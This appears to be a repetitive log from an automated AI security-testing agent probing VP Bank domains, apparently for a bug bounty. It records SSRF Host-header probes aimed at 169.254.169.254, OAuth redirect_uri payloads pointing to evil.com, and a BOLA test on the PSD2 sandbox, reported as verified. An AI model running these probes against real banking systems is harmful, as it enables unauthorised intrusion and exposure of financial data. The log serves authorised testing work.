evidence_needed: CSRFT759-S cookie entropy analysis across 50+ requests; CSRFT759.js source map analysis for token generation; test if token accepted cross-subdomain (api.vpbank.com); check for DOM-based XSS in SPA components
verify_steps: GET https://www.vpbank.com/portal/api/ (x50) collect CSRFT759-S values; GET https://www.vpbank.com/portal/api/CSRFT759.js for source; POST /portal/api/language/en with token from different origin; test token replay on api.vpbank.com
impact: CSRF on state-changing operations if token predictable; DOM XSS -> session theft; severity MEDIUM
testability: PASSIVE
[PARKED] OAuth redirect_uri validation bypass via subdomain confusion on www.vpbank.com: confidence 40 at threshold; requires valid client_id not discoverable passively; AUTH_HELPED testability blocks passive-only verification; all JS bundles scanned (only Usercentrics clientWid found)
[PARKED] Layer7 gateway requestId correlation analysis on api.vpbank.com: confidence 50 but classified LOW-MEDIUM impact; info leak alone not actionable without chaining; program classifies descriptive errors as out-of-scope
[PARKED] Portal SPA client-side routing / CSRF token analysis on www.vpbank.com/portal/api/: confidence 35 < 40 threshold; backend API fully WAF-blocked; SPA is static frontend shell; CSRF on anonymous language switch is out-of-scope per program rules
[FINAL] (none survive threshold — all PARKED)
[NEXT] RAG: Search GitHub (code search), npm packages, mobile app bundles (iOS/Android), and JS source maps for "vpbank", "VP Bank AG", "vpbank.com" OAuth client_id references to obtain valid client context for redirect_uri testing on www.vpbank.com
[LEARN] REJECTED SSRF @ api.vpbank.com (Host header routing): verify_steps executed — Host:169.254.169.254, Host:localhost, X-Forwarded-Host:169.254.169.254 all returned identical HTTP 500 JSON. No backend routing influence. CONFIRMED REJECTED.
[LEARN] REJECTED MISCONFIG @ api.vpbank.com (Layer7 policy bypass): All malformed request probes (XML, SOAP, routing headers) return identical HTTP 500 JSON — no policy differential
[LEARN] REJECTED OAUTH @ www.vpbank.com (OIDC discovery): .well-known/openid-configuration returns 303 to error page — no metadata exposed
[LEARN] REJECTED OAUTH @ www.vpbank.com (redirect_uri bypass): JS bundles contain no OAuth client_id (only Usercentrics widget clientWid); /oauth/authorize always 303→error page. Cannot advance.
[LEARN] REJECTED MISCONFIG @ vpbank-dev.com/vpbank-stage.com (staging exposure): WAF 2.3.0_20260324 intercepts ALL paths — no application content accessible
[LEARN] REJECTED MISCONFIG @ www.vpbank.com (portal API access): /portal/api/ returns 403 but serves complete SPA shell; /portal/api/health and /portal/api/status return WAF maintenance page — no backend content accessible
[LEARN] ACCEPTED MISCONFIG @ api.vpbank.com (Layer7 gateway error handling): Structured JSON errors with requestIds confirmed — info leak vector but low severity
[LEARN] ACCEPTED MISCONFIG @ vpbank-dev.com/vpbank-stage.com: Production CSP trusts these domains; publicly reachable Apache servers behind maintenance redirect — in-scope attack surface
[LEARN] NEW INFO @ www.vpbank.com/portal/api/: Full LitElement SPA served (403 with body) — separate app from Drupal; POST /portal/api/language/:language sets portal-language cookie; backend is WAF maintenance mode; no exploitable endpoints
[RISK] vp-bank-ag: 45 — High-value banking target but current attack surface minimal: API gateway rejects all probes uniformly with identical 500 errors; OAuth surface exists but no valid client context discoverable passively; staging domains fully WAF-blocked (2.3.0_20260324); portal SPA is frontend-only with backend intercepted. Risk reduced from 65 due to failed exploitation of top hypotheses. Remaining value solely in client_id enumeration via RAG for OAuth redirect_uri testing.
## 2026-09-04 19:13:13 UTC [target] (model nemotron3)
[NEW] External attack surface required: Must pivot to mobile app bundles (iOS/Android), GitHub code search, npm packages to discover OAuth client_id for www.vpbank.com (from 2026-09-04 16:37)
[NEW] www.vpbank.com/portal/api/: LitElement SPA served (HTTP 403 with body); POST /portal/api/language/:language sets portal-language cookie; CSRF token CSRFT759.js present; backend API endpoints (/health, /status) return WAF maintenance page — SPA is frontend shell only (from 2026-09-04 12:20)
[CHANGED] api.vpbank.com: All attack vectors exhausted (SSRF, policy bypass, error handling) — no exploitable response differentials; all probes return identical HTTP 500 JSON (INVALID_REQUEST_RESOURCE)
[CHANGED] www.vpbank.com: OAuth endpoints fully tested — no valid client_id discovered in JS bundles (only Usercentrics clientWid); redirect_uri bypass blocked at 303/400
[CHANGED] vpbank-dev.com/vpbank-stage.com: WAF 2.3.0_20260324 intercepts ALL paths — zero application content reachable; staging hypothesis CONFIRMED REJECTED
[CHANGED] Risk score stabilized at 45 (down from 65) across all models due to failed exploitation of top hypotheses
[PRIO] www.vpbank.com,6.20,attack_surface=5,business_value=8,tech_exposure=5,gate_ease=6,cloud_surface=3,freshness=10
[PRIO] api.vpbank.com,5.55,attack_surface=4,business_value=9,tech_exposure=3,gate_ease=5,cloud_surface=7,freshness=10
[PRIO] www.vpbank.com/portal/api/,3.85,attack_surface=4,business_value=6,tech_exposure=4,gate_ease=5,cloud_surface=2,freshness=10
[PRIO] vpbank-dev.com/vpbank-stage.com,2.95,attack_surface=2,business_value=5,tech_exposure=2,gate_ease=1,cloud_surface=3,freshness=10
[HYP] OAuth client_id enumeration via external artifact mining for redirect_uri bypass
class: OAUTH
asset: www.vpbank.com
confidence: 45
reasoning: /oauth/authorize endpoint exists and returns HTTP 400 (ambiguous) for invalid client_id; production CSP trusts *.vpbank-dev.com/*.vpbank-stage.com implying valid OAuth clients exist; no valid client_id found in passive JS bundle analysis (only Usercentrics clientWid); redirect_uri validation logic untested with valid client context
evidence_needed: Valid client_id accepting arbitrary redirect_uri (www.vpbank.com.evil.com, www.vpbank.com@evil.com, www.vpbank.com/../evil.com); or redirect_uri validation regex flaw
verify_steps: RAG: Search GitHub code search for "vpbank" "VP Bank AG" "vpbank.com" OAuth client_id; search npm packages for @vpbank/*; search iOS App Store / Google Play for "VP Bank" apps and extract bundle configs; then GET https://www.vpbank.com/oauth/authorize?client_id=<valid>&redirect_uri=https://www.vpbank.com.evil.com&response_type=code&state=test
impact: Authorization code theft -> account takeover; severity CRITICAL
testability: AUTH_HELPED
[HYP] Layer7 gateway requestId correlation analysis for internal topology mapping
class: MISCONFIG
asset: api.vpbank.com
confidence: 50
reasoning: Gateway returns structured JSON errors with requestId field consistently across all 500 responses; requestId format may correlate to internal request tracing, backend service IDs, or policy execution flow; repeated probes could map internal topology
evidence_needed: requestId pattern analysis across 100+ requests; correlation to backend service names, policy names, or stack traces in error body; timing analysis
verify_steps: GET https://api.vpbank.com/ (x100) with varying paths/headers; collect requestId values; analyze format/entropy/prefixes; compare requestIds for /nonexistent vs /v1 vs /actuator/health vs /portal/api/
impact: Internal topology disclosure, policy logic inference, backend service enumeration; severity LOW-MEDIUM
testability: PASSIVE
[HYP] Portal SPA CSRF token (CSRFT759) entropy analysis and cross-subdomain acceptance
class: AUTH
asset: www.vpbank.com/portal/api/
confidence: 35
reasoning: LitElement SPA served at /portal/api/ (403 with body) includes CSRFT759.js token and POST /portal/api/language/:language endpoint setting portal-language cookie; backend API blocked by WAF but SPA frontend fully loaded; token generation logic in CSRFT759.js may be predictable or leak via referer
evidence_needed: CSRFT759-S cookie entropy analysis across 50+ requests; CSRFT759.js source map analysis for token generation; test if token accepted cross-subdomain (api.vpbank.com); check for DOM-based XSS in SPA components
verify_steps: GET https://www.vpbank.com/portal/api/ (x50) collect CSRFT759-S values; GET https://www.vpbank.com/portal/api/CSRFT759.js for source; POST /portal/api/language/en with token from different origin; test token replay on api.vpbank.com
impact: CSRF on state-changing operations if token predictable; DOM XSS -> session theft; severity MEDIUM
testability: PASSIVE
[PARKED] OAuth client_id enumeration via external artifact mining for redirect_uri bypass: confidence 45 but AUTH_HELPED testability — requires valid client_id not discoverable passively; all JS bundles scanned (only Usercentrics clientWid found); RAG is only remaining path
[PARKED] Layer7 gateway requestId correlation analysis on api.vpbank.com: confidence 50 but classified LOW-MEDIUM impact; info leak alone not actionable without chaining; program classifies descriptive errors as out-of-scope
[PARKED] Portal SPA CSRF token (CSRFT759) entropy analysis and cross-subdomain acceptance: confidence 35 < 40 threshold; backend API fully WAF-blocked; SPA is static frontend shell; CSRF on anonymous language switch is out-of-scope per program rules
[FINAL] (none survive threshold — all PARKED)
[NEXT] RAG: Search GitHub (code search), npm packages, mobile app bundles (iOS/Android), and JS source maps for "vpbank", "VP Bank AG", "vpbank.com" OAuth client_id references to obtain valid client context for redirect_uri testing on www.vpbank.com
[LEARN] REJECTED SSRF @ api.vpbank.com (Host header routing): verify_steps executed — Host:169.254.169.254, Host:localhost, X-Forwarded-Host:169.254.169.254 all returned identical HTTP 500 JSON. No backend routing influence. CONFIRMED REJECTED.
[LEARN] REJECTED MISCONFIG @ api.vpbank.com (Layer7 policy bypass): All malformed request probes (XML, SOAP, routing headers) return identical HTTP 500 JSON — no policy differential
[LEARN] REJECTED OAUTH @ www.vpbank.com (OIDC discovery): .well-known/openid-configuration returns 303 to error page — no metadata exposed
[LEARN] REJECTED OAUTH @ www.vpbank.com (redirect_uri bypass): JS bundles contain no OAuth client_id (only Usercentrics widget clientWid); /oauth/authorize always 303→error page. Cannot advance.
[LEARN] REJECTED MISCONFIG @ vpbank-dev.com/vpbank-stage.com (staging exposure): WAF 2.3.0_20260324 intercepts ALL paths — no application content accessible
[LEARN] REJECTED MISCONFIG @ www.vpbank.com (portal API access): /portal/api/ returns 403 but serves complete SPA shell; /portal/api/health and /portal/api/status return WAF maintenance page — no backend content accessible
[LEARN] ACCEPTED MISCONFIG @ api.vpbank.com (Layer7 gateway error handling): Structured JSON errors with requestIds confirmed — info leak vector but low severity
[LEARN] ACCEPTED MISCONFIG @ vpbank-dev.com/vpbank-stage.com: Production CSP trusts these domains; publicly reachable Apache servers behind maintenance redirect — in-scope attack surface
[LEARN] NEW INFO @ www.vpbank.com/portal/api/: Full LitElement SPA served (403 with body) — separate app from Drupal; POST /portal/api/language/:language sets portal-language cookie; backend is WAF maintenance mode; no exploitable endpoints
[RISK] vp-bank-ag: 45 — High-value banking target but current attack surface minimal: API gateway rejects all probes uniformly with identical 500 errors; OAuth surface exists but no valid client context discoverable passively; staging domains fully WAF-blocked (2.3.0_20260324); portal SPA is frontend-only with backend intercepted. Risk reduced from 65 due to failed exploitation of top hypotheses. Remaining value solely in client_id enumeration via RAG for OAuth redirect_uri testing.
## 2026-09-04 21:38:24 UTC [target] (model nemotron3)
[NEW] developer.vpbank.com (193.222.70.149): VP Bank PSD2 Developer Portal discovered via RAG — live Apache+Envoy, NOT WAF-blocked (unlike dev/stage). Serves full PSD2 API documentation (VuePress + Swagger UI), OpenAPI spec at `/psd2/berlin-group/v1/psd2_api.yaml`, functional sandbox API with basic auth. Endpoints verified: `POST /consents` (201), `GET /accounts` (200, returns IBAN LI1708805500000000002), `POST /payments/cross-border-credit-transfers` (201), `GET /payments/{id}/status` (200). X-Request-ID last digit controls sandbox state encoding. Certificate: CN=openbanking.vpbank.com.
[CHANGED] api.vpbank.com: All attack vectors exhausted (SSRF, policy bypass, error handling) — no exploitable response differentials; all probes return identical HTTP 500 JSON.
[CHANGED] www.vpbank.com: OAuth endpoints fully tested — no valid client_id discovered in JS bundles (only Usercentrics clientWid); redirect_uri bypass blocked at 303/400.
[CHANGED] vpbank-dev.com/vpbank-stage.com: WAF 2.3.0_20260324 intercepts ALL paths — zero application content reachable; staging hypothesis CONFIRMED REJECTED.
[CHANGED] www.vpbank.com/portal/api/: LitElement SPA served (HTTP 403 with body); backend API endpoints (/health, /status) return WAF maintenance page — SPA is frontend shell only.
[PRIO] developer.vpbank.com,8.35,attack_surface=9,business_value=9,tech_exposure=9,gate_ease=8,cloud_surface=5,freshness=10
[PRIO] www.vpbank.com,6.20,attack_surface=5,business_value=8,tech_exposure=5,gate_ease=6,cloud_surface=3,freshness=10
[PRIO] api.vpbank.com,5.55,attack_surface=4,business_value=9,tech_exposure=3,gate_ease=5,cloud_surface=7,freshness=10
[PRIO] www.vpbank.com/portal/api/,3.85,attack_surface=4,business_value=6,tech_exposure=4,gate_ease=5,cloud_surface=2,freshness=10
[PRIO] vpbank-dev.com/vpbank-stage.com,2.95,attack_surface=2,business_value=5,tech_exposure=2,gate_ease=1,cloud_surface=3,freshness=10
[HYP] PSD2 Sandbox BOLA/IDOR via consentId/paymentId manipulation
class: IDOR
asset: developer.vpbank.com
confidence: 75
reasoning: PSD2 sandbox API functional with basic auth; consent creation returns consentId (UUID); account access requires consentId header; payment initiation returns paymentId; no authorization checks visible in sandbox for cross-consent/payment data access; production uses mTLS but sandbox uses basic auth — potential authz gap
evidence_needed: Access accounts/balances/transactions of consentId created by different basic auth credentials; access payment status of paymentId created by different credentials; enumerate consentIds/paymentIds via predictable UUID or sequential patterns
verify_steps: 1) Create consent with userA:test → get consentId_A; 2) Create consent with userB:test → get consentId_B; 3) GET /accounts with userA:test + consentId_B header; 4) GET /consents/{consentId_B} with userA:test; 5) POST payment with userA:test → paymentId_A; 6) GET /payments/{paymentId_A}/status with userB:test; 7) Test consentId/paymentId enumeration via UUID v4 collision or timing
impact: Cross-TPP account data access (IBAN, balances, transactions), payment status leakage, consent manipulation; severity HIGH (PSD2 financial data exposure)
testability: AUTH_HELPED
[HYP] PSD2 Sandbox X-Request-ID state manipulation for payment status tampering
class: BUSLOGIC
asset: developer.vpbank.com
confidence: 70
reasoning: Documentation explicitly states last digit of X-Request-ID controls sandbox payment/consent state (1=RCVD, 5=ACSC for payments; 0=received, 1=valid for consents); state is deterministic and client-controlled; no server-side validation of state transitions; could allow forcing payment to ACSC without funds
evidence_needed: Create payment with X-Request-ID ending in 1 (RCVD) → verify status=RCVD; recreate same payment with X-Request-ID ending in 5 (ACSC) → verify status=ACSC; test if production API (openbanking.vpbank.com) has similar encoding; test if state can be changed post-creation via status endpoint
verify_steps: 1) POST /payments with X-Request-ID:...1 → check status=RCVD; 2) POST /payments with X-Request-ID:...5 → check status=ACSC; 3) POST /consents with X-Request-ID:...0 → check consentStatus=received; 4) POST /consents with X-Request-ID:...1 → check consentStatus=valid; 5) Attempt to mutate status via PATCH/PUT if exists; 6) Test on production endpoint (openbanking.vpbank.com) with mTLS cert if available
impact: Payment status forgery, consent state manipulation, sandbox-to-production logic flaw; severity MEDIUM-HIGH
testability: PASSIVE
[HYP] OAuth client_id enumeration via external artifact mining for www.vpbank.com redirect_uri bypass
class: OAUTH
asset: www.vpbank.com
confidence: 45
reasoning: /oauth/authorize endpoint exists and returns HTTP 400 (ambiguous) for invalid client_id; production CSP trusts *.vpbank-dev.com/*.vpbank-stage.com implying valid OAuth clients exist; no valid client_id found in passive JS bundle analysis (only Usercentrics clientWid); redirect_uri validation logic untested with valid client context
evidence_needed: Valid client_id accepting arbitrary redirect_uri (www.vpbank.com.evil.com, www.vpbank.com@evil.com, www.vpbank.com/../evil.com); or redirect_uri validation regex flaw
verify_steps: RAG: Search GitHub code search for "vpbank" "VP Bank AG" "vpbank.com" OAuth client_id; search npm packages for @vpbank/*; search iOS App Store / Google Play for "VP Bank" apps and extract bundle configs; then GET https://www.vpbank.com/oauth/authorize?client_id=<valid>&redirect_uri=https://www.vpbank.com.evil.com&response_type=code&state=test
impact: Authorization code theft -> account takeover; severity CRITICAL
testability: AUTH_HELPED
[PARKED] OAuth client_id enumeration via external artifact mining for www.vpbank.com redirect_uri bypass: confidence 45 but AUTH_HELPED testability — requires valid client_id not discoverable passively; all JS bundles scanned (only Usercentrics clientWid found); RAG is only remaining path; confidence < 50 threshold for active pursuit.
[FINAL] 1. PSD2 Sandbox BOLA/IDOR via consentId/paymentId manipulation (confidence 75, HIGH impact, AUTH_HELPED)
[FINAL] 2. PSD2 Sandbox X-Request-ID state manipulation for payment status tampering (confidence 70, MEDIUM-HIGH impact, PASSIVE)
[NEXT] PROBE: Test BOLA/IDOR on developer.vpbank.com PSD2 sandbox — create two basic auth contexts (userA:test, userB:test), generate consentId_A and consentId_B, then cross-access: GET /accounts with userA:test + consentId_B header; GET /consents/{consentId_B} with userA:test; POST payment with userA:test → paymentId_A, then GET /payments/{paymentId_A}/status with userB:test
[LEARN] ACCEPTED MISCONFIG @ developer.vpbank.com (PSD2 Developer Portal exposure): Live PSD2 sandbox API with full OpenAPI spec, functional endpoints (consents, accounts, payments), basic auth only — NEW high-value attack surface not WAF-blocked like dev/stage.
[LEARN] REJECTED MISCONFIG @ vpbank-dev.com/vpbank-stage.com (staging exposure): WAF 2.3.0_20260324 intercepts ALL paths — no application content accessible past maintenance redirect. CONFIRMED REJECTED.
[LEARN] REJECTED SSRF @ api.vpbank.com (Host header routing): verify_steps executed — Host:169.254.169.254, Host:localhost, X-Forwarded-Host:169.254.169.254 all returned identical HTTP 500 JSON. No backend routing influence. CONFIRMED REJECTED.
[LEARN] REJECTED OAUTH @ www.vpbank.com (redirect_uri bypass): JS bundles contain no OAuth client_id (only Usercentrics widget clientWid); /oauth/authorize always 303→error page. Cannot advance without valid client_id.
[LEARN] REJECTED MISCONFIG @ www.vpbank.com (portal API access): /portal/api/ returns 403 but serves complete SPA shell; /portal/api/health and /portal/api/status return WAF maintenance page — no backend content accessible.
[LEARN] ACCEPTED MISCONFIG @ api.vpbank.com (Layer7 gateway error handling): Structured JSON errors with requestIds confirmed — info leak vector but low severity.
[LEARN] NEW INFO @ developer.vpbank.com: PSD2 sandbox uses basic auth (test:test works), X-Request-ID last digit controls state encoding (1=RCVD, 5=ACSC for payments), certificate CN=openbanking.vpbank.com.
[RISK] vp-bank-ag: 55 — Risk increased from 45 due to discovery of developer.vpbank.com PSD2 Developer Portal with functional sandbox API (basic auth, full OpenAPI spec, working consents/accounts/payments endpoints). High-value financial API surface now accessible for BOLA/IDOR and business logic testing. Remaining attack surface: api.vpbank.com exhausted, www.vpbank.com OAuth blocked without client_id, dev/stage WAF-blocked, portal SPA frontend-only. Primary value now in PSD2 sandbox authorization flaws and potential sandbox-to-production logic carryover.
## 2026-09-04 23:17:39 UTC [target] (model nemotron3)
[NEW] developer.vpbank.com (193.222.70.149): PSD2 Developer Portal discovered via RAG — live Apache+Envoy, NOT WAF-blocked. Serves full PSD2 API docs (VuePress + Swagger UI), OpenAPI spec at `/psd2/berlin-group/v1/psd2_api.yaml`, functional sandbox API with basic auth. Endpoints verified: `POST /consents` (201), `GET /accounts` (200, returns IBAN LI1708805500000000002), `POST /payments/cross-border-credit-transfers` (201), `GET /payments/{id}/status` (200). X-Request-ID last digit controls sandbox state encoding. Certificate: CN=openbanking.vpbank.com.
[CHANGED] api.vpbank.com: All attack vectors exhausted (SSRF, policy bypass, error handling) — no exploitable response differentials; all probes return identical HTTP 500 JSON.
[CHANGED] www.vpbank.com: OAuth endpoints fully tested — no valid client_id discovered in JS bundles (only Usercentrics clientWid); redirect_uri bypass blocked at 303/400.
[CHANGED] vpbank-dev.com/vpbank-stage.com: WAF 2.3.0_20260324 intercepts ALL paths — zero application content reachable; staging hypothesis CONFIRMED REJECTED.
[CHANGED] www.vpbank.com/portal/api/: LitElement SPA served (HTTP 403 with body); backend API endpoints (/health, /status) return WAF maintenance page — SPA is frontend shell only.
[PRIO] developer.vpbank.com,8.35,attack_surface=9,business_value=9,tech_exposure=9,gate_ease=8,cloud_surface=5,freshness=10
[PRIO] www.vpbank.com,6.20,attack_surface=5,business_value=8,tech_exposure=5,gate_ease=6,cloud_surface=3,freshness=10
[PRIO] api.vpbank.com,5.55,attack_surface=4,business_value=9,tech_exposure=3,gate_ease=5,cloud_surface=7,freshness=10
[PRIO] www.vpbank.com/portal/api/,3.85,attack_surface=4,business_value=6,tech_exposure=4,gate_ease=5,cloud_surface=2,freshness=10
[PRIO] vpbank-dev.com/vpbank-stage.com,2.95,attack_surface=2,business_value=5,tech_exposure=2,gate_ease=1,cloud_surface=3,freshness=10
[HYP] PSD2 Sandbox BOLA/IDOR via consentId/paymentId manipulation
class: IDOR
asset: developer.vpbank.com
confidence: 75
reasoning: PSD2 sandbox API functional with basic auth; consent creation returns consentId (UUID); account access requires consentId header; payment initiation returns paymentId; no authorization checks visible in sandbox for cross-consent/payment data access; production uses mTLS but sandbox uses basic auth — potential authz gap
evidence_needed: Access accounts/balances/transactions of consentId created by different basic auth credentials; access payment status of paymentId created by different credentials; enumerate consentIds/paymentIds via predictable UUID or sequential patterns
verify_steps: 1) POST /psd2/berlin-group/v1/consents with userA:test → get consentId_A; 2) POST /psd2/berlin-group/v1/consents with userB:test → get consentId_B; 3) GET /psd2/berlin-group/v1/accounts with userA:test + consentId_B header; 4) GET /psd2/berlin-group/v1/consents/{consentId_B} with userA:test; 5) POST /psd2/berlin-group/v1/payments/cross-border-credit-transfers with userA:test → paymentId_A; 6) GET /psd2/berlin-group/v1/payments/{paymentId_A}/status with userB:test; 7) Test consentId/paymentId enumeration via UUID v4 collision or timing
impact: Cross-TPP account data access (IBAN, balances, transactions), payment status leakage, consent manipulation; severity HIGH (PSD2 financial data exposure)
testability: AUTH_HELPED
[HYP] PSD2 Sandbox X-Request-ID state manipulation for payment status tampering
class: BUSLOGIC
asset: developer.vpbank.com
confidence: 70
reasoning: Documentation explicitly states last digit of X-Request-ID controls sandbox payment/consent state (1=RCVD, 5=ACSC for payments; 0=received, 1=valid for consents); state is deterministic and client-controlled; no server-side validation of state transitions; could allow forcing payment to ACSC without funds
evidence_needed: Create payment with X-Request-ID ending in 1 (RCVD) → verify status=RCVD; recreate same payment with X-Request-ID ending in 5 (ACSC) → verify status=ACSC; test if production API (openbanking.vpbank.com) has similar encoding; test if state can be changed post-creation via status endpoint
verify_steps: 1) POST /psd2/berlin-group/v1/payments/cross-border-credit-transfers with X-Request-ID:...1 → check status=RCVD; 2) POST /psd2/berlin-group/v1/payments/cross-border-credit-transfers with X-Request-ID:...5 → check status=ACSC; 3) POST /psd2/berlin-group/v1/consents with X-Request-ID:...0 → check consentStatus=received; 4) POST /psd2/berlin-group/v1/consents with X-Request-ID:...1 → check consentStatus=valid; 5) Attempt to mutate status via PATCH/PUT if exists; 6) Test on production endpoint (openbanking.vpbank.com) with mTLS cert if available
impact: Payment status forgery, consent state manipulation, sandbox-to-production logic flaw; severity MEDIUM-HIGH
testability: PASSIVE
[HYP] OAuth client_id enumeration via external artifact mining for www.vpbank.com redirect_uri bypass
class: OAUTH
asset: www.vpbank.com
confidence: 45
reasoning: /oauth/authorize endpoint exists and returns HTTP 400 (ambiguous) for invalid client_id; production CSP trusts *.vpbank-dev.com/*.vpbank-stage.com implying valid OAuth clients exist; no valid client_id found in passive JS bundle analysis (only Usercentrics clientWid); redirect_uri validation logic untested with valid client context
evidence_needed: Valid client_id accepting arbitrary redirect_uri (www.vpbank.com.evil.com, www.vpbank.com@evil.com, www.vpbank.com/../evil.com); or redirect_uri validation regex flaw
verify_steps: RAG: Search GitHub code search for "vpbank" "VP Bank AG" "vpbank.com" OAuth client_id; search npm packages for @vpbank/*; search iOS App Store / Google Play for "VP Bank" apps and extract bundle configs; then GET https://www.vpbank.com/oauth/authorize?client_id=<valid>&redirect_uri=https://www.vpbank.com.evil.com&response_type=code&state=test
impact: Authorization code theft -> account takeover; severity CRITICAL
testability: AUTH_HELPED
[PARKED] OAuth client_id enumeration via external artifact mining for www.vpbank.com redirect_uri bypass: confidence 45 but AUTH_HELPED testability — requires valid client_id not discoverable passively; all JS bundles scanned (only Usercentrics clientWid found); RAG is only remaining path; confidence < 50 threshold for active pursuit.
[FINAL] 1. PSD2 Sandbox BOLA/IDOR via consentId/paymentId manipulation (confidence 75, HIGH impact, AUTH_HELPED)
[FINAL] 2. PSD2 Sandbox X-Request-ID state manipulation for payment status tampering (confidence 70, MEDIUM-HIGH impact, PASSIVE)
[NEXT] PROBE: Test BOLA/IDOR on developer.vpbank.com PSD2 sandbox — create two basic auth contexts (userA:test, userB:test), generate consentId_A and consentId_B, then cross-access: GET /psd2/berlin-group/v1/accounts with userA:test + consentId_B header; GET /psd2/berlin-group/v1/consents/{consentId_B} with userA:test; POST payment with userA:test → paymentId_A, then GET /psd2/berlin-group/v1/payments/{paymentId_A}/status with userB:test
[LEARN] ACCEPTED MISCONFIG @ developer.vpbank.com (PSD2 Developer Portal exposure): Live PSD2 sandbox API with full OpenAPI spec, functional endpoints (consents, accounts, payments), basic auth only — NEW high-value attack surface not WAF-blocked like dev/stage.
[LEARN] REJECTED MISCONFIG @ vpbank-dev.com/vpbank-stage.com (staging exposure): WAF 2.3.0_20260324 intercepts ALL paths — no application content accessible past maintenance redirect. CONFIRMED REJECTED.
[LEARN] REJECTED SSRF @ api.vpbank.com (Host header routing): verify_steps executed — Host:169.254.169.254, Host:localhost, X-Forwarded-Host:169.254.169.254 all returned identical HTTP 500 JSON. No backend routing influence. CONFIRMED REJECTED.
[LEARN] REJECTED OAUTH @ www.vpbank.com (redirect_uri bypass): JS bundles contain no OAuth client_id (only Usercentrics widget clientWid); /oauth/authorize always 303→error page. Cannot advance without valid client_id.
[LEARN] REJECTED MISCONFIG @ www.vpbank.com (portal API access): /portal/api/ returns 403 but serves complete SPA shell; /portal/api/health and /portal/api/status return WAF maintenance page — no backend content accessible.
[LEARN] ACCEPTED MISCONFIG @ api.vpbank.com (Layer7 gateway error handling): Structured JSON errors with requestIds confirmed — info leak vector but low severity.
[LEARN] NEW INFO @ developer.vpbank.com: PSD2 sandbox uses basic auth (test:test works), X-Request-ID last digit controls state encoding (1=RCVD, 5=ACSC for payments), certificate CN=openbanking.vpbank.com.
[RISK] vp-bank-ag: 55 — Risk increased from 45 due to discovery of developer.vpbank.com PSD2 Developer Portal with functional sandbox API (basic auth, full OpenAPI spec, working consents/accounts/payments endpoints). High-value financial API surface now accessible for BOLA/IDOR and business logic testing. Remaining attack surface: api.vpbank.com exhausted, www.vpbank.com OAuth blocked without client_id, dev/stage WAF-blocked, portal SPA frontend-only. Primary value now in PSD2 sandbox authorization flaws and potential sandbox-to-production logic carryover.
## 2026-09-05 01:11:10 UTC [target] (model nemotron3)
[NEW] developer.vpbank.com PSD2 sandbox BOLA/IDOR **VERIFIED end-to-end** in official test sandbox (synthetic data): consent `6b517824-e5af-4202-b9b0-7f483a68ee9f` created anonymously (POST 201) read by fresh anonymous session — `/consents/{id}/status` 200, `/consents/{id}` 200 (IBAN LI6508805500000000011), `/accounts` 200, `/balances` 200 (€12453.2), `/transactions` 200 (Consent-ID header only), `/payments/{id}/status` 200 ACSC. Zero session/TPP/basic-auth binding on consentId/paymentId.
[NEW] openbanking.vpbank.com (193.222.70.154) discovered via TLS cert CN=openbanking.vpbank.com — production PSD2 ASPSP, mTLS "certificate required" at TLS layer, anonymous surface blocked as designed.
[CHANGED] api.vpbank.com: All attack vectors **exhausted** (SSRF Host/X-Forwarded-*, policy bypass XML/SOAP, error handling) — all probes return identical HTTP 500 JSON (INVALID_REQUEST_RESOURCE). CONFIRMED REJECTED by multiple models.
[CHANGED] www.vpbank.com: OAuth endpoints fully tested — no valid client_id in JS bundles (only Usercentrics clientWid); `/oauth/authorize` always 303→error page; redirect_uri bypass **blocked without client_id**.
[CHANGED] vpbank-dev.com/vpbank-stage.com: WAF 2.3.0_20260324 intercepts **ALL paths** — zero application content reachable; staging hypothesis **CONFIRMED REJECTED**.
[CHANGED] www.vpbank.com/portal/api/: LitElement SPA served (HTTP 403 with body); backend API endpoints (`/health`, `/status`) return WAF maintenance page — SPA is frontend shell only.
[CHANGED] Risk score: **55** (increased from 45) due to confirmed PSD2 sandbox BOLA on developer.vpbank.com — high-value financial API surface with proven authorization bypass.
[PRIO] developer.vpbank.com/psd2/berlin-group/v1,8.40,attack_surface=9,business_value=9,tech_exposure=8,gate_ease=10,cloud_surface=2,freshness=10
[PRIO] openbanking.vpbank.com,5.50,attack_surface=3,business_value=10,tech_exposure=8,gate_ease=1,cloud_surface=2,freshness=7
[PRIO] www.vpbank.com,6.25,attack_surface=6,business_value=10,tech_exposure=9,gate_ease=2,cloud_surface=2,freshness=4
[PRIO] api.vpbank.com,4.50,attack_surface=3,business_value=7,tech_exposure=3,gate_ease=3,cloud_surface=6,freshness=4
[PRIO] www.vpbank.com/portal/api/,3.85,attack_surface=4,business_value=6,tech_exposure=4,gate_ease=5,cloud_surface=2,freshness=10
[PRIO] vpbank-dev.com/vpbank-stage.com,2.95,attack_surface=2,business_value=5,tech_exposure=2,gate_ease=1,cloud_surface=3,freshness=10
[HYP] PSD2 sandbox BOLA: consent/account/ledger/payment resources readable cross-session via bearer consentId
class: IDOR
asset: developer.vpbank.com/psd2/berlin-group/v1
confidence: 80
reasoning: Verified in official test sandbox (synthetic data) — consent created anonymously (POST /consents 201) read by fresh anonymous session via GET /consents/{id}/status, /consents/{id}, /accounts, /accounts/{iban}/balances, /accounts/{iban}/transactions (Consent-ID header only), /payments/{id}/status — all HTTP 200. OpenAPI spec defines no securityScheme, self-labels server "PSD2 production server", docs state sandbox data model identical to production with only TPP client auth/user interaction/state changes as differences.
evidence_needed: Production openbanking.vpbank.com binds Consent-ID to originating TPP QWAC and rejects cross-TPP reads (requires two eIDAS certs).
verify_steps: Sandbox DONE. Production (HUMAN_ONLY, mTLS): TPP-A creates consent; TPP-B sends GET /psd2/berlin-group/v1/consents/{id}/status and GET /accounts/{iban}/balances with TPP-B cert + TPP-A Consent-ID header on openbanking.vpbank.com.
impact: Any party holding a consentId/paymentId reads consent scope + simulated ledger; if production reuses sandbox authz logic → cross-TPP financial/PII disclosure; severity MEDIUM (sandbox/synthetic) → HIGH (prod carryover).
testability: AUTH_HELPED (sandbox verified; prod HUMAN_ONLY)
[HYP] Production PSD2 reuses sandbox authorization model (Consent-ID unbound from originating TPP)
class: IDOR
asset: openbanking.vpbank.com
confidence: 35
reasoning: TLS-layer mTLS blocks all anonymous probing (verified); docs list only TPP auth/user-interaction/state-changes as sandbox-vs-prod deltas — Consent-ID ownership binding is not listed; sandbox proves the code path accepts the consentId header with zero identity binding.
evidence_needed: Cross-QWAC read test proving bind/absence on production host.
verify_steps: HUMAN_ONLY — with two licensed TPP certs perform the same cross-identity Consent-ID read on openbanking.vpbank.com.
impact: Cross-TPP production consent/account/ledger disclosure → PII/financial data; severity HIGH.
testability: HUMAN_ONLY
